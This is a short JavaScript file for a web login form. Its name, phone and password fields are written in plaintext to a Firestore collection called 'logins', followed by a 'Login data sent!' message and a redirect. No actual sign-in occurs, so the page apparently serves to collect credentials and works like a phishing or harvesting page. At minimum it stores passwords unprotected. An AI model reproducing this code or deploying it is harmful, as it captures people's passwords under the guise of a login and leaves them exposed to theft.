// TODO: Replace with your Firebase project config
const firebaseConfig = {
  apiKey: "AIzaSyCpZUZ_V-m1i71hB58T3QHKcapL_qs_49M",
  authDomain: "reflex-tap-7815f.firebaseapp.com",
  projectId: "reflex-tap-7815f",
  storageBucket: "reflex-tap-7815f.firebasestorage.app",
  messagingSenderId: "833157218846",
  appId: "1:833157218846:web:77bbf1c73b299004a1e40f",
  measurementId: "G-ZDHDZJ7J0B"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

const loginForm = document.getElementById('loginForm');
const messageDiv = document.getElementById('message');

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const name = document.getElementById('name').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const password = document.getElementById('password').value;

    try {
        await db.collection('logins').add({
            name,
            phone,
            password,
            timestamp: firebase.firestore.FieldValue.serverTimestamp()
        });
        messageDiv.style.color = '#38a169';
        messageDiv.textContent = 'Login data sent!';
        loginForm.reset();
        setTimeout(() => {
            window.location.href = 'home.html';
        }, 800);
    } catch (err) {
        messageDiv.style.color = '#e53e3e';
        messageDiv.textContent = 'Error sending data. Try again.';
    }
});
